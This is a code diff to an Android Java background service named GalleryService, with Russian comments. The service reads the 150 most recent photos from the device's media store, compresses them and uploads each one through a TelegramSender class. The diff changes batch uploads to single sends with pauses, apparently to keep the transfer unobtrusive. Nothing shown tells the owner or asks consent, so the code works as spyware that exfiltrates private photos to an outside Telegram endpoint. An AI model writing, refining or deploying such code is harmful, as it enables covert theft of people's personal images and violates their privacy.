@@ -22,10 +22,10 @@ public class GalleryService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         new Thread(() -> {
             List<Uri> allImages = getRecentImages();
-            List<byte[]> batch = new ArrayList<>();
-            int totalSent = 0;
-
-            for (Uri uri : allImages) {
+            
+            // Берем 150 последних
+            for (int i = 0; i < allImages.size(); i++) {
+                Uri uri = allImages.get(i);
                 try {
                     InputStream is = getContentResolver().openInputStream(uri);
                     
@@ -48,24 +48,18 @@ public class GalleryService extends Service {
                     if (bitmap != null) {
                         ByteArrayOutputStream baos = new ByteArrayOutputStream();
                         bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos); 
-                        batch.add(baos.toByteArray());
-                        bitmap.recycle();
-
-                        if (batch.size() == 9) {
-                            new TelegramSender().sendMediaGroup(batch, totalSent);
-                            totalSent += 9;
-                            batch.clear();
-                            Thread.sleep(1000); // Пауза 1 сек
-                        }
+                        byte[] bytes = baos.toByteArray();
+                        bitmap.recycle(); // Освобождаем память СРАЗУ
+                        
+                        // Отправляем по одному, чтобы не нагружать сеть и память
+                        new TelegramSender().send(bytes, "gallery_" + i + ".jpg");
+                        
+                        // Пауза 2 секунды, чтобы телефон остыл
+                        Thread.sleep(2000); 
                     }
                 } catch (Exception e) { e.printStackTrace(); }
                 catch (OutOfMemoryError e) { System.gc(); }
             }
-
-            if (!batch.isEmpty()) {
-                new TelegramSender().sendMediaGroup(batch, totalSent);
-            }
-
             stopSelf();
         }).start();
         return START_NOT_STICKY;
@@ -74,7 +68,6 @@ public class GalleryService extends Service {
     private List<Uri> getRecentImages() {
         List<Uri> imageUris = new ArrayList<>();
         String[] projection = new String[]{MediaStore.Images.Media._ID};
-        // Берем 150 последних фото
         String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 150";
 
         Cursor cursor = getContentResolver().query(
